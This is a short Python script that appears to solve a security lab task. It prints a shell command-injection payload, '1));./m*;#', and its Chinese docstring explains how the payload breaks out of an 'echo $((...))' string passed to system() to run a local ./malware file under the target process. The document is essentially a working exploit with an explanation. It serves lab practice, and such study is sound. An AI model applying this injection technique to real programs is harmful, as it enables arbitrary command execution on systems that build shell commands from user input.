#!/usr/bin/env python3
"""Task 1: 利用缓冲区漏洞执行 ./malware。

eval() 会把输入拼成 "echo $((" + 前 15 字节 + "))" 再交给 system()。
输入 "1));./m*;#" 拼出的最终命令是：
    echo $((1));./m*;#))
其中 "1))" 闭合算术展开，";" 结束 echo，"m*" 通配为 malware，
"#" 注释掉末尾补上的 "))"。malware 是 system 启动的 /bin/sh 的子进程，
其祖先进程里有 dark-calc，因此脚本检查通过。
"""
import sys

payload = b"1));./m*;#\n"

sys.stdout.buffer.write(payload)
